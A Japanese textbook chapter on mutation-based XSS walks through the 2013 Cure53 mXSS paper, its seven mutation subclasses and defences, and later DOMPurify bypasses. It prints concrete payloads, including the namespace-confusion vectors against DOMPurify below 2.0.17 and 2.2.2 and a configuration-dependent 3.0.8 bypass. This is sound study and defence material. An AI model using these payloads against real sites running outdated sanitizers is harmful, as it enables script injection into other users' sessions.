# 第4章 高度なXSS（本丸）― mXSS・サニタイザ回避・prototype pollution・DOM clobbering・CSP回避・script gadgets

## mXSSの原典（Cure53論文 fp170）

反射型・格納型・DOMベースといった「素朴なXSS」を一通り理解した学習者が、次に足を踏み入れるべき最も重要な領域のひとつが **mXSS（mutation-based XSS、変異型XSS）** です。mXSSは「サニタイザ（入力に含まれる危険な文字列を無害な形に変換・除去する処理）がいったん安全だと判断して通したはずのHTMLが、ブラウザに渡った瞬間に**別の、危険なHTMLへと化ける（=変異する）**」という、直感に反する現象を突く攻撃クラスです。フィルタもWAF（Web Application Firewall、HTTPを検査してXSS等を遮断する防御機構）もサニタイザも、みな「自分が見た文字列が、そのまま実行される文字列だ」と暗黙に信じています。mXSSはその**信頼そのもの**を破壊します。

この攻撃クラスを世界で初めて体系的に定義・命名し、理論的基礎を与えたのが、本節の主資料である **Mario Heiderich（マリオ・ハイデリッヒ）ら Cure53 の論文 "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations"（通称 fp170）** です。この論文は、それまで単発の「面白いブラウザのバグ」としてしか見られていなかった一連の現象を、「サニタイザのパイプラインに構造的に存在する欠陥」として統一的に説明し、以後10年以上にわたって続くDOMPurifyバイパスの攻防（後述）の起点となりました。本節ではこの原典を精読し、その論理・分類・具体的ペイロード・防御策を、原文を読まなくても完全に理解できるレベルまで分解します。

---

### 書誌情報 — この論文は何者か

- **正式タイトル**: *mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations*
- **著者**: Mario Heiderich、Jörg Schwenk、Tilman Frosch（以上ルール大学ボーフム）、Jonas Magazinius（チャルマース工科大学、スウェーデン）、Edward Z. Yang（スタンフォード大学、米国）
- **発表**: 2013年11月4〜8日、**ACM CCS 2013**（ACM Conference on Computer and Communications Security）、ベルリン（ドイツ）。トップティアのセキュリティ国際会議の査読付き論文です。
- **DOI**: http://dx.doi.org/10.1145/2508859.2516723
- **Cure53の整理番号**: `fp170`（Cure53が公開資料に振る "fingerprint" 番号。URLの `fp170.pdf` はこれに由来）
- **姉妹プレゼン**: 同じ内容を筆頭著者Heiderichが講演した "The innerHTML Apocalypse"（OWASP AppSec Research EU 2013 / Hack in Paris 2013）が存在し、スライドはHeiderich（@x00mario）名義で公開されています。

この論文の歴史的意義は二つあります。第一に、**"mutation-based XSS (mXSS)" という用語と攻撃クラスを初めて定義した**こと。第二に、著者らがこの論文の問題意識から実際の防御ライブラリ **DOMPurify** を生み出し（Cure53製）、それが今日のクライアント側HTMLサニタイズの事実上の標準になったことです。つまりfp170は「攻撃の原典」であると同時に「現代の主要な防御の出発点」でもあります。

> 出典: mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（原典より） — http://dx.doi.org/10.1145/2508859.2516723

---

### mXSSとは何か — 定義

論文のAbstractは次のように述べています。

> 2007年、長谷川陽介（Hasegawa）が単一のブラウザ実装におけるバッククォート文字の誤処理に基づく新しいXSSベクタを発見した。これは当初、容易に修正できる実装エラーのように見えた。しかし、本論文が示すように、これは**mutation-based XSS (mXSS) ベクタという新しいクラスの最初の例**であり、innerHTMLおよび関連プロパティで発生しうるものであった。mXSSはIE・Firefox・Chromeの**3大ブラウザファミリすべて**に影響する。

この定義を噛み砕くと、mXSS（変異型XSS）とは次のような攻撃です。

> **攻撃者は、サニタイザ・フィルタ・WAFといった防御機構に「安全である」と判定される無害なHTML文字列を用意する。ところがその文字列が、ブラウザによってDOM（Document Object Model、HTMLをブラウザがツリー構造のオブジェクトとして表現したもの）へ取り込まれ、あるいは `innerHTML` を通じて読み書きされる過程で、ブラウザ自身の手によって別のHTML構造へと「変異（mutation）」させられ、その変異後の構造がスクリプトを実行する。**

ポイントは、**攻撃者が注入した文字列そのものにはスクリプト実行の要素が（防御機構から見える形では）含まれていない**という点です。危険なコードは、ブラウザのパーサ（HTMLを解釈してDOMツリーを組み立てる部品）とシリアライザ（DOMツリーをHTML文字列に戻す部品）の**挙動の中から自然発生的に生まれます**。防御機構は「実行されるコード」を一度も見ないまま通してしまう——これがmXSSの本質であり、従来のXSS対策（危険なタグや属性を探して除去する）がまるごと無力化される理由です。

論文の副題にある通り、mXSSが恐ろしいのは「よく守られたアプリ（well-secured web-applications）」をこそ破る点です。素朴なアプリは単純なXSSで落ちますが、mXSSはHTML Purifierのような高品質なサニタイザを**正しく使っていてもなお**成立しました。

> 出典: mXSS Attacks（原典 Abstract より）

---

### 根本原理 — パースの非対称性と「べき等でないサニタイズ」

mXSSを仕組みのレベルで理解する鍵は、**サニタイズ処理のパイプライン**と、そこに潜む**パースの非対称性（parse/serialize asymmetry）**です。ここがこの節で最も重要な部分です。

#### サニタイズ・パイプラインの5段階

サーバ側であれクライアント側であれ、HTMLサニタイザは概念的に次のステップを踏みます。

1. **パース（解析）**: 入力HTML文字列 `D` を、パーサでDOMツリーへ変換する。
2. **サニタイズ**: DOMツリーを走査し、危険な要素（`<script>` など）・属性（`onerror` など）・URL（`javascript:` など）を削除する。
3. **シリアライズ**: サニタイズ済みのDOMツリーを、再びHTML文字列へ書き戻す。
4. **再パース（挿入）**: その文字列が最終的にブラウザに渡り、`element.innerHTML = ...` のような形で**もう一度パースされて**実DOMに挿入される。
5. **描画**: 実DOMがレンダリングされる。

問題は、**ステップ1のパーサとステップ4のパーサ（＝実ブラウザのパーサ）が、同じ文字列を同じDOMに解釈するとは限らない**こと、そして**ステップ3のシリアライザが、ステップ1で読んだのと同じ文字列を出力するとは限らない**ことです。

#### `P(P(D)) ≠ P(D)`：非べき等性がすべての元凶

これを一つの式で表すと、mXSSの本質は **パース処理 `P` が「べき等（idempotent）でない」** ことに帰着します。べき等とは「同じ処理を2回かけても1回と結果が変わらない」性質のことです（例: 絶対値をとる操作はべき等）。理想的なサニタイザは、一度サニタイズした出力をもう一度パースしても構造が変わらない、すなわち

```
P(P(D)) = P(D)     ← 安全（べき等）
```

であってほしい。ところが現実のブラウザでは、

```
P(P(D)) ≠ P(D)     ← 危険（非べき等）＝ mXSS の温床
```

となる場合が存在します。1回目のパース＆シリアライズで得た「安全に見える文字列」を、ブラウザが2回目にパースすると、**別の（実行可能な）DOMツリー**が生まれてしまう。この「1回目と2回目のズレ」こそが変異（mutation）であり、攻撃者はこのズレの中に悪意あるコードを"畳み込んで"おくのです。

#### innerHTML変異のトリガー条件

論文のSection 2.1は、変異が発生する具体的なトリガーを4つ挙げています。

1. **`innerHTML` または `outerHTML` プロパティへのアクセス**（読み取り・書き込み）
2. **コピー（およびその後のペースト）操作**によるHTMLデータの受け渡し
3. **HTMLエディタへのアクセス** — `contenteditable`、`designMode`、`document.execCommand()` を介した操作
4. **印刷プレビュー**やそれに類する中間的なレンダリング処理

特に驚くべきは、変異を引き起こす最小限のコードが論文のListing 3に示されている次のたった1行であることです。

```javascript
window.onload = function() {
    document.body.innerHTML += '';
}
```

空文字列を `innerHTML` に追加するだけ——つまり「何も変えていない」にもかかわらず、ブラウザの内部では `innerHTML` の**読み取り**（シリアライズ）と**書き戻し**（再パース）が発生し、その往復で変異が起きます。

#### なぜ「サーバ側サニタイザ」が特に脆弱なのか

論文が突いた核心は次の一文に集約されます。「**サーバ側フィルタとクライアント側（ブラウザ）は、HTMLの解釈について同一の理解を共有していると暗黙に仮定しているが、それは誤りである**」。

サーバ側サニタイザ（PHPのHTML Purifier、WordPressのkses、htmlLawed など）は、独自のHTMLパーサやDOMライブラリ（あるいはXMLパーサ）で入力を解釈します。しかし最終的にその出力を解釈するのは**ユーザーのブラウザ**であり、両者のパーサは仕様の細部・エラー回復・独自拡張が食い違います。特に致命的なのが次の二つです。

- **`innerHTML` のラウンドトリップ**: JavaScriptで `el.innerHTML` を**読む**と、ブラウザはその要素の子DOMを**シリアライズして文字列を返します**。そしてその文字列を別の要素に `otherEl.innerHTML = str` で**書き戻す**と、再パースされます。この「read→write」の往復（round-trip）で、ブラウザ独自のシリアライズ規則が発動し、元と違う文字列・DOMになります。多くのクライアント側サニタイザ（当時のjQueryプラグイン等）や、DOMを触るWYSIWYGエディタが、この往復を内部で行っていました。
- **RAWTEXT/RCDATA要素のコンテキスト差**: `<style>`, `<xmp>`, `<textarea>`, `<title>`, `<noscript>`, `<iframe>`, `<noembed>`, `<noframes>` などの要素は、その**中身の解釈ルールが特殊**です（後述）。サーバ側パーサとブラウザで、この中身が「ただのテキスト」なのか「生きたHTML」なのかの判定が食い違うと、そこがそっくり実行コードに化けます。

> 出典: mXSS Attacks（原典 Section 2.1 より）

---

### 論文が分類した7つのmXSSサブクラスと具体的ペイロード

論文は、当時知られていた／新たに発見したmXSSベクタを**7つのサブクラス**に整理しました（Table 1）。以下、各サブクラスを、論文のセクション番号・ペイロード・ブラウザ出力とともに、**なぜ動くのか**の原理を添えて解説します。

#### サブクラス1（Section 3.1）: バッククォート文字が属性区切り構文を破壊する

mXSSという概念の**歴史的な出発点**であり、論文が「最初のmXSS」として引用する事例です。2007年に長谷川陽介（Hasegawa）氏が発見した、IEのバッククォート（`` ` ``）処理のバグに由来します。

**ペイロード（原典より）**:
```html
<img src="test.jpg" alt="``onload=xss()" />
```

**ブラウザ出力（原典より）**:
```html
<IMG alt=``onload=xss() src="test.jpg">
```

**なぜ動くのか**: 攻撃者はまず、`alt` 属性の値として `` ``onload=xss() `` という、ダブルクォートで正しく囲まれた**無害な文字列**を仕込みます。サニタイザから見ると `alt` はただのテキスト属性で、危険な要素はどこにもないので通過します。ところがIE（旧バージョン）は、**バッククォートを属性値の正当な区切り文字（クォート）として扱う**という非標準の癖を持っていました。このため、この要素の `innerHTML` を読み出すと、IEのシリアライザはダブルクォートを使わずバッククォートを区切りに使った形で出力します。この文字列を**再パース**すると、IEは先頭の `` `` `` を「空のバッククォート区切りの値」と解釈し、続く `onload=xss()` を**独立した新しい属性**として認識してしまいます。結果、当初はただの `alt` テキストだったものが、`onload` イベントハンドラに変異し、画像読み込み時に `xss()` が実行されます。

**バージョン依存性の注意**: このバッククォート変異は主に **IE8以前（およびそれらの互換モード）** に固有の挙動です。現代のChrome/Firefox/Edge（Chromium版）では再現しません。歴史的重要性は極めて高いものの、実戦で狙う場面は現在ほぼありません。

#### サブクラス2（Section 3.2）: 未知要素中のXML名前空間が構造変異を引き起こす

**ペイロード（原典より）**:
```html
<article xmlns="urn:img src=x onerror=xss()//">123
```

**ブラウザ出力（原典より）**:
```html
<img src=x onerror=xss()//:article xmlns="urn:img src=x onerror=xss()//">123</img src=x onerror=xss()//:article>
```

**なぜ動くのか**: `<article>` はHTML5の標準要素ですが、`xmlns` 属性にXMLの名前空間URIを指定すると、一部のブラウザのシリアライザがこれをXML風の要素として再構成します。その際、名前空間URIの文字列 `urn:img src=x onerror=xss()//` がタグ名の接頭辞として展開され、`<img src=x onerror=xss()//: ...>` という新たなタグ構造に化けます。再パース時にブラウザはこの文字列中の `<img src=x onerror=xss()` 部分を生きた `<img>` 要素として認識し、`onerror` ハンドラが実行されます。名前空間URIがタグ名に「展開」されるという、XMLとHTMLの境界の歪みを突いた変異です。

#### サブクラス3（Section 3.3）: CSSエスケープ中のバックスラッシュが文字列境界を侵犯する

`style` 属性（インラインCSS）を許可しているサニタイザを破る、論文の目玉の一つです。CSSには、任意の文字をバックスラッシュ＋16進コードで表す**CSSエスケープ**（例: `\27` は `'`、`\3b` は `;`）という記法があります。

**ペイロード（原典より）**:
```html
<p style="font-family:'ar\27\3bx\3aexpression\28xss\28\29\29\3bial'">
```

**ブラウザ出力（原典より）**:
```html
<P style="FONT-FAMILY:'ar';x:expression(xss());ial'">
```

**なぜ動くのか**: サニタイザがこの `style` を検査する時点では、値は `font-family:'ar\27\3bx\3aexpression\28xss\28\29\29\3bial'` という**単一の `font-family` プロパティの文字列リテラル**にしか見えません。`\27`（`'`）も `\3b`（`;`）もまだエスケープされたままなので、プロパティの区切りにはならず、危険な `expression()`（IEのCSS拡張で、CSSの値としてJavaScriptを評価・実行してしまう悪名高い機能）も文字列の中に閉じ込められた無害なテキストとして扱われ、フィルタを通過します。ところがIEの `innerHTML` シリアライザは、この `style` を書き戻す際に**CSSエスケープをデコードして生の文字に戻して**しまいます。すると `\27` が `'` に戻り文字列リテラルが `'ar'` で閉じられ、`\3b` が `;` に戻りプロパティが区切られ、`\3a` が `:` に、`\28`/`\29` が `(`/`)` に戻って `x:expression(xss())` という**新しいCSS宣言**が出現します。

特筆すべきは、論文がこのサブクラスについて**再帰的変異（recursive mutation）**を指摘していることです。二重エスケープされた文字（例えば `\\27` のような形）は、1回目の `innerHTML` アクセスで1段デコードされ、2回目のアクセスでさらにもう1段デコードされます。つまり `innerHTML` を複数回往復させるだけで、段階的に変異が進行する場合があります。

**バージョン依存性の注意**: `expression()` は **IEのみ**の機能で、IE8以前で有効、IE9以降の標準モードでは無効化、IE11でほぼ撤廃されました。ただし「CSSエスケープが `innerHTML` 往復でデコードされてプロパティ境界が崩れる」という**変異の原理そのもの**は普遍的です。

#### サブクラス4（Section 3.4）: エンティティ表現中の不適合文字がCSS文字列を破壊する

**ペイロード（原典より）**:
```html
<p style="font-family:'ar&quot;;x=expression(xss())/*ial'">
```

**ブラウザ出力（原典より）**:
```html
<P style="FONT-FAMILY:'ar';x=expression(xss())/*ial'">
```

**なぜ動くのか**: サブクラス3と原理は近いですが、こちらはバックスラッシュのCSSエスケープではなく、**HTMLエンティティ**（`&quot;`、`&#x22;`、`&#34;`、あるいはCSSの `\22`）を利用します。サニタイザが `style` 属性値を検査する時点では、`&quot;` はHTMLエンティティのままなので、CSS文字列の内部にある無害なテキストに見えます。ところが `innerHTML` アクセス時にブラウザがこれらのエンティティをすべて生の `"` に変換してしまい、CSS文字列リテラルの境界が崩壊して `expression(xss())` が新たなCSS宣言として復活します。論文は、`\22`、`&quot;`、`&#x22;`、`&#34;` のいずれの表記でもinnerHTMLアクセス時に `"` へ変換されることを確認しています。

#### サブクラス5（Section 3.5）: CSSプロパティ名中のCSSエスケープがHTML構造全体を侵犯する

このサブクラスでは、CSSの**プロパティ名**（値ではなく）にCSSエスケープを埋め込み、`innerHTML` のシリアライズ時にそれがデコードされることで、CSSの境界を越えてHTML構造そのものが破壊されます。たとえば、CSSプロパティ名に `</style>` 相当のエスケープシーケンスを仕込み、デコード後に `<style>` 要素が早期に閉じられて後続の文字列がHTML要素として脱出する——という、CSSとHTMLの境界を横断する変異です。

#### サブクラス6（Section 3.6）: 非HTMLドキュメントにおけるエンティティ変異

XHTML（`application/xhtml+xml`）やXMLなど、HTML以外のドキュメント型において、エンティティの解釈規則がHTMLと異なることを利用した変異です。XMLではHTMLとは異なるエンティティの集合が定義され、未定義エンティティの扱いも異なります。サニタイザがHTML用の規則でエンティティを処理した結果が、XML/XHTMLパーサで異なるデコードを受けて変異を引き起こします。

#### サブクラス7（Section 3.7）: HTMLドキュメントの非HTMLコンテキストにおけるエンティティ変異

HTMLドキュメントの中にあるが**HTMLとして解釈されないコンテキスト**——具体的には `<style>`, `<xmp>`, `<listing>`, `<title>`, `<textarea>`, `<noscript>`, `<noembed>`, `<noframes>`, `<iframe>` 等のRAWTEXT/RCDATA要素の内部——でのエンティティ変異です。

- **RAWTEXT要素**（`<style>`, `<xmp>`, `<noembed>` 等）: 中身はタグもエンティティも解釈されない「生テキスト」。閉じタグ（例 `</style>`）が来るまで、`<` すら普通の文字として扱われる。
- **RCDATA要素**（`<title>`, `<textarea>`）: 中身のタグは解釈されないが、**HTMLエンティティ（`&lt;` など）はデコードされる**。

mXSSは、この「中身がテキスト扱いか、生きたHTML扱いか」の判定が、サニタイザ側とブラウザ側（あるいは名前空間の違いで）食い違う点、およびエンティティのデコード有無が往復でズレる点を突きます。論文が挙げる典型は「あるコンテキストではエンティティ化されて無害だった文字列が、別コンテキストへ移された瞬間に生のHTMLとして復活する」というものです。このサブクラスは後年の名前空間混同mXSS（SVG/MathML内の `<style>` を利用するもの）の直接の源流となりました。

> 出典: mXSS Attacks（原典 Table 1 および Section 3.1〜3.7 より）

---

### 論文の実証 — 何を、どれだけ破ったのか

fp170が学術論文として説得力を持ったのは、これらのベクタが**現実の一流アプリと一流の防御を実際に破った**ことを示した点にあります。

#### 破られた実アプリ（格納型mXSSを実証）

著者らは、以下の**高知名度アプリケーションに格納型（stored）mXSSベクタを実際に設置**できたと報告しています。多くはHTMLメール本文を扱うWebメールで、送られたHTMLメールが受信者のブラウザで整形される過程を突きます。

- Yahoo! Mail
- Rediff Mail
- OpenExchange（Open-Xchange）
- Zimbra
- Roundcube
- その他複数の商用製品

#### 破られた防御機構

さらに衝撃的なのは、当時「これを使っておけば安全」とされていた**あらゆる層の防御を横断的にバイパス**したことです。**テスト時点で、対象となったサニタイザはすべて脆弱であった**と論文は報告しています。

**サーバ側XSSサニタイザ**:
- HTML Purifier
- kses（WordPress）
- htmlLawed
- Blueprint
- Google Caja（サーバ側）
- OWASP AntiSamy
- jSoup

**クライアント側フィルタ**:
- XSS Auditor（Chrome）
- IE XSS Filter

**ネットワーク層**:
- WAF（Web Application Firewall）各種
- IDS/IPS（侵入検知／防止システム）

#### 影響範囲

mXSSは特定ブラウザの奇癖にとどまらず、**IE・Firefox・Chromeの3大ブラウザファミリすべて**に影響することも示されました。つまり、これは「直せば済むバグ」ではなく、HTMLの解析・シリアライズという**Webの基盤設計に構造的に埋め込まれた欠陥**だ、という強いメッセージになりました。

> 出典: mXSS Attacks（原典 Abstract および評価セクションより）

---

### 論文が提案した防御策

論文は攻撃を示すだけでなく、具体的な防御の方向性を提示しました。

#### サーバ側の防御（Section 5.1）

論文は、サーバ側サニタイザに対して以下の対策を提案しました。

1. **ブラウザが誤処理する特殊文字の禁止**: サーバ側でサニタイズする際、ブラウザのシリアライザが変異を引き起こすことが分かっている文字を、たとえエスケープ済みでも禁止する。
2. **属性値への末尾空白の追加**: 属性値の末尾にホワイトスペースを強制的に挿入することで、ブラウザのシリアライザがクォートを省略する余地を排除する（バッククォート変異への対処）。
3. **CSS特殊文字の完全排除**: CSSプロパティの値においては、エスケープ済みの形でも危険文字を許容してはならない（CSSエスケープ変異への対処）。

著者らはこれらの修正を**HTML Purifier**に実際に実装しました。

#### クライアント側の防御（Section 5.2）— TrueHTML

論文の最も重要な防御提案が、クライアント側で動作する **TrueHTML** プロトタイプです。

- **仕組み**: `innerHTML` のgetterを**インターセプタ（傍受関数）で上書き**し、ブラウザ独自のHTMLシリアライズの代わりに `XMLSerializer.serializeToString()` を使用して変異のないシリアライズ結果を返す。
- **サイズ**: わずか **820バイト**。
- **利点**: 変異のない出力、低パフォーマンス影響、透過的（既存のコードを変更不要）、Webサイト非依存。

#### TrueHTMLの評価データ（Section 6）

著者らはAlexa上位10,000サイトを調査し、約**1/3が `innerHTML` を使用**、約**65%がjQueryを使用**していることを確認しました。これらのサイトに対するTrueHTMLのパフォーマンスオーバーヘッドは以下の通りです。

- **中央値（median）**: 25.73%
- **90パーセンタイル**: 68.37%

評価対象にはDuckDuckGo、メール本文表示、Baidu、Facebook、Google、YouTube、Twitter、Yahoo、Google Mapsが含まれています。

この問題意識の直接の産物が、Cure53が後に開発した **DOMPurify** です。DOMPurifyは「DOM上でサニタイズし、サニタイズ後に**もう一度シリアライズ→再パースして結果を再検査する**」というアプローチで、`P(P(D)) ≠ P(D)` の非べき等性そのものに対処しようとします。fp170は攻撃の原典であると同時に、この現代的防御の思想的な出発点でもあるのです。

> 出典: mXSS Attacks（原典 Section 5 および Section 6 より）

---

### 原典のその後 — 名前空間混同mXSSの系譜（発展的補足）

（以下はfp170原典そのものではなく、その予言がどう的中したかを追う発展的補足です。中〜上級読者が実戦で出会うのはむしろこちらなので、バージョンと年を明記して整理します。）

fp170が「名前空間の混同は続く」と警告した通り、mXSSは**DOMPurifyバイパスの歴史**として現在まで生き続けています。原理はすべてfp170の `P(P(D)) ≠ P(D)` に帰着します。以下、主要な事件を時系列で示します。**いずれも「対象バージョン」「発見年」「修正状況」を明記します**（バージョン依存の攻撃は陳腐化するため、常にこの3点セットで捉えてください）。

#### 2018年 — Gareth Heyes、EdgeのタイトルエンティティによるDOMPurifyバイパス

```html
<title>&lt/title&gt&ltimg&sol;src=&quot&quotonerror&equals;alert(1)&gt
```

**なぜ動くのか**: RCDATA要素 `<title>` の中身のエンティティを、当時のEdge（旧EdgeHTML）が特殊にデコードし、`&lt/title&gt` が `</title>` に化けて早期に閉じ、後続の `<img ... onerror=alert(1)>` が生きた要素として復活します。エンティティ・デコードの食い違い（サブクラス7）の一種です。
- **修正**: DOMPurifyが該当バージョンで対応済み。EdgeHTML自体もその後Chromiumベースへ移行し消滅。

> 出典: MXSS Evolution and Timeline（Gareth "Edge" mXSS 2018、msrkp/MXSS） — https://github.com/msrkp/MXSS

#### 2019年 — SecurityMB、SVGの `</p>` 早期クローズによる変異

```html
<svg></p><style><g title="</style><img src onerror=alert(1)>">
```

**なぜ動くのか**: `<svg></p>` はブラウザによって `<svg><p></p></svg>` に補完され（`</p>` が孤立クローズなので空の `<p>` が生成される）、`<p>` がSVG内に一瞬存在します。この構造の食い違いにより、後段の `<style>`（SVG内）のRAWTEXT境界がズレ、`</style>` で閉じた後の `<img>` が実行コンテキストへ脱出します。
- **修正**: DOMPurifyが対応。

> 出典: MXSS Evolution and Timeline（SecurityMB "SVG </p>" mXSS 2019、msrkp/MXSS） — https://github.com/msrkp/MXSS

#### 2020年 — SecurityMB（Michal Bentkowski）、MathML名前空間切り替えによる **DOMPurify < 2.0.17** バイパス

これは**バージョン依存mXSSの代表例**として必ず押さえるべき事件です。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**なぜ動くのか**: 二つの高度なパーサ挙動を組み合わせます。
1. **フォームのネスト禁止**: HTMLパーサは `<form>` の入れ子を許しません。1回目の解析では内側の `<form>` が（一時的に）存在し得る構造になりますが、2回目の解析（再パース）では**内側の `<form>` が削除**され、DOMツリーの親子関係が変化します。
2. **MathMLテキスト統合点（text integration point）の名前空間規則**: `<mtext>` はMathMLの「テキスト統合点」で、その**直接の子はデフォルトでHTML名前空間**として扱われます。ただし例外が二つあり、`<mglyph>` と `<malignmark>` だけは（直接の子である場合に限り）MathML名前空間に留まります。

1回目の解析（サニタイザが見る木）では `<style>` の子孫がHTML名前空間にあり、その中の `<img>` は無害なRAWTEXTの一部に見えます。ところがフォーム削除によって親子関係が変わり、`<mglyph>` が `<mtext>` の直接の子になると、**その子孫（`<style>` とその中身）がMathML名前空間に切り替わり**、`<style>` の中身がもはやRAWTEXTではなくなって、隠れていた `<img src onerror=alert(1)>` がHTML要素として解釈・実行されます。「最終DOMではMathML名前空間、サニタイズ時DOMではHTML名前空間」という食い違い、まさにfp170の名前空間混同（サブクラス2/7）の現代版です。
- **対象**: DOMPurify **2.0.17 未満**
- **発見年**: 2020年、発見者 Michal Bentkowski（@SecurityMB、Securitum）
- **修正**: **DOMPurify 2.0.17** で修正。Bentkowski自身が提案した「**全要素について親の名前空間と照合して検証する**」防御（PR #495）が導入され、これが以後数年間の名前空間混同に対する決定打となりました。

> 出典: Mutation XSS via namespace confusion — DOMPurify < 2.0.17 bypass（Securitum research、Michal Bentkowski、2020） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
> 出典: Harden protection against mutation XSS caused by namespace switching（cure53/DOMPurify PR #495） — https://github.com/cure53/DOMPurify/pull/495

#### 2020年 — Daniel Santos、SVGへ「往復」する名前空間混同による **DOMPurify < 2.2.2** バイパス

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><x id="&lt;/style><img onerror=alert(1) src>">
```

**なぜ動くのか**: 上記2.0.17バイパスの発展形で、`<svg>` を混同経路に組み込み、「HTML→MathML→SVG→HTML」と名前空間を渡り歩かせます。2番目の `<mtext>` によって、1回目の解析ではペイロードがHTML名前空間に留まり無害に見えますが、フォーム削除後の再パースで `<style>` の子孫の名前空間が切り替わり、`&lt;/style>` がデコード・再解釈されて `<img onerror=alert(1)>` が脱出・実行されます。SVGの `id` 属性を自由記述の「安全な入れ物」として悪用する点が新しい工夫です。
- **対象**: DOMPurify **2.2.2 未満**
- **発見年**: 2020年11月、発見者 Daniel Santos（@bananabr）
- **修正**: **DOMPurify 2.2.2** で修正（Bentkowski提案の親名前空間検証をさらに強化）。

> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos、2020年11月） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

#### 参考: テーブルのフォスター親（foster parenting）を絡めたコメント変異（Gareth Heyes ほか）

```html
<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
```

**なぜ動くのか**: HTMLパーサには「**フォスター親（foster parenting）**」という規則があり、`<table>` の中に置けない要素（`<mglyph>` など）は、テーブルの**外へ自動的に移動**させられます。1回目の解析では `<mglyph>` がテーブル外へ運ばれる一方、2回目の解析ではMathML名前空間内で再解釈され、**HTML名前空間では無視されるはずの `<style>` 内のコメント `<!-- -->` が、MathMLでは無視されなくなる**ため、コメントの中に隠していた `<img ... onerror=alert(1)>` が復活・実行されます。名前空間による「コメントの扱いの違い」を突く、非常に巧妙な変異です。

> 出典: MXSS Evolution and Timeline（foster parenting とコメント操作トリック、msrkp/MXSS） — https://github.com/msrkp/MXSS

#### 2024年 — Kevin Mizu、非デフォルト設定下での **DOMPurify 3.0.8** バイパス

```javascript
DOMPurify.sanitize(`<svg><annotation-xml><foreignobject><style><!--</style><p id="--><img src='x' onerror='alert(1)'>">`, {
    CUSTOM_ELEMENT_HANDLING: { tagNameCheck: /.*/ },
    FORBID_CONTENTS: [""]
});
```

**なぜ動くのか**: これは**設定依存**のバイパスです。`CUSTOM_ELEMENT_HANDLING.tagNameCheck: /.*/`（任意のカスタム要素を許可）と `FORBID_CONTENTS: [""]`（内容削除の無効化）という、安全でない設定を組み合わせると、`<annotation-xml>` や `<foreignobject>` が生き残り、DOMPurifyが後段でこれらを削除する際に `<style>` が再配置されてHTML名前空間へ復帰し、コメントに隠した `<img onerror=alert(1)>` が実行されます。**デフォルト設定のDOMPurifyは安全**で、危険な設定を明示的に有効にした場合にのみ成立する点が重要です。
- **対象**: DOMPurify **3.0.8**（非デフォルト設定時）
- **発見年**: 2024年、発見者 Kevin Mizu
- **教訓**: `CUSTOM_ELEMENT_HANDLING` の緩い正規表現や `FORBID_CONTENTS` の弱体化など、**設定でサニタイザを緩めるとmXSSが再来する**。

> 出典: Exploring the DOMPurify library: Bypasses and Fixes（Kevin Mizu、2024） — https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

### 現代の防御と、この原典から学ぶべきこと

fp170の10年以上にわたる余波を踏まえると、実務者・研究者が持つべき教訓は次の通りです。

1. **「サニタイズした文字列」と「実行される文字列」は別物になり得る**、という前提を常に持つ。防御は「危険物を消す」だけでなく、**サニタイズ後に再シリアライズ・再パースして結果を再検査する**（`P(P(D)) = P(D)` を保証しにいく）べき。DOMPurifyはまさにこの思想で作られている。
2. **名前空間（HTML/SVG/MathML）の切り替えは第一級の攻撃面**である。SVG/MathMLを許可するなら、各ノードを**親の名前空間と照合して検証**する必要がある（Bentkowskiの修正が事実上の標準解）。不要なら許可しないのが最善。
3. **サニタイズはクライアント側（ブラウザと同じパーサ）で行うのが原則**。サーバ側パーサとブラウザのパーサの理解の食い違いこそがfp170の突いた急所であり、DOMPurifyのようにブラウザ自身のDOMを使う設計がこれを構造的に回避する。
4. **属性値中の `<`, `>` を含む危険文字は必ずエスケープ**する。Googleが後年示した通り、属性値内の山括弧エスケープは名前空間混同を含む多くのmXSSを封じる安価で強力な防御になる。
5. **多層防御**: 万一の変異に備え、**CSP**（`script-src` の厳格化、`unsafe-inline` 排除）や、より根本的には **Trusted Types**（危険なsink〈ユーザー入力が最終的に実行・解釈される代入先。例: `innerHTML`〉への文字列代入をブラウザレベルで禁じ、検証済みオブジェクトのみ許す仕組み）を併用する。
6. **バージョンと設定を常に確認する**。mXSSはバージョン依存・設定依存が極端に強い。DOMPurifyを使うなら**最新版を、デフォルトに近い安全な設定で**使い、`ADD_TAGS`/`CUSTOM_ELEMENT_HANDLING`/`FORBID_CONTENTS` などで防御を緩めていないか点検する。

fp170は、単発のブラウザバグの寄せ集めに見えた現象の背後に「パースの非対称性」という統一原理を見出し、それに `mutation-based XSS` という名を与えたことで、Web防御の常識を書き換えました。そして著者ら自身がDOMPurifyという形で「答え」を実装し、以後の攻防のフィールドを用意しました。**mXSSを学ぶことは、Webのセキュリティを『文字列マッチング』から『構造とパーサの理解』へと引き上げる旅の出発点**なのです。

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> 出典: DOMPurify 公式リポジトリ — https://github.com/cure53/DOMPurify

---

### この節の主要出典一覧

- mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（原典、ACM CCS 2013） — http://dx.doi.org/10.1145/2508859.2516723
- MXSS Evolution and Timeline: A primer to MXSS（s1r1us、GitHubミラー） — https://github.com/msrkp/MXSS
- The innerHTML Apocalypse（Mario Heiderich の発表資料） — https://www.slideshare.net/x00mario/the-innerhtml-apocalypse
- Mutation XSS via namespace confusion — DOMPurify < 2.0.17 bypass（Securitum、Michal Bentkowski、2020） — https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
